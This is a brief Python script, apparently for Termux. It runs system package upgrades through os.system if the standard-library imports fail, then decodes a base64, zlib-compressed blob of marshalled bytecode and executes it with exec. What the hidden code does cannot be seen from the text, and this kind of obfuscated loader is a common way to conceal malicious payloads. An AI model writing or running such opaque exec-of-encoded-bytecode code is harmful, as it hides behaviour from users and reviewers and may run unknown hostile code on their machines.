

try:
    import marshal,base64,zlib
except:
    import os
    os.system("pkg update && pkg upgrade")
    os.system("clear")
Iike=b'eJxLZkADLEDsAMTFSkAihSGFMYchiiGFKYU5kzGKMZUplWEBcyrjQsZmRkagXDCDJstLkC6/KOaMxMwo1ozUnJx8TZYolqzi/Lwo5oqUtFusBUWZeSW3WFNKcwuKVzIUMQOVg4lb7CH5BZkVwU63OGxy81NKc1LtGEEWcwAJDmYmBqb/LMwA8jciAA=='
exec(marshal.loads(zlib.decompress(base64.urlsafe_b64decode(Iike))))
